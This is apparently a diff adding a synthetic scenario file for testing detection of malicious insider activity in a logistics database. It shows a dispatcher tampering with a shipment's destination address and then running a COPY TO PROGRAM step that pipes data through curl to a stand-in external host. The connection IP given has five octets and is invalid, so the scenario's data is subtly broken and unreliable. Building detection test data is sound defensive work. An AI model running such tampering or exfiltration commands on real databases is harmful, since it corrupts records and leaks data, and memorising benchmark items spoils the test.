@@ -1,0 +1,23 @@
+scenario_id: gen_logistics_36_data_tamper_mal_931
+family_id: gen_logistics_36_data_tamper_mal_fam931
+domain: logistics
+time_of_day: 04:50
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: dispatcher
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.5
+  events:
+  - step_id: act
+    sql: UPDATE shipments SET dest_address = 290233 WHERE shipment_id = 61256
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://clearinghouse-batch.example/ingest
+      -d @-'
+    connects_to:
+      ip: 185.220.101.125.40
+      port: 443
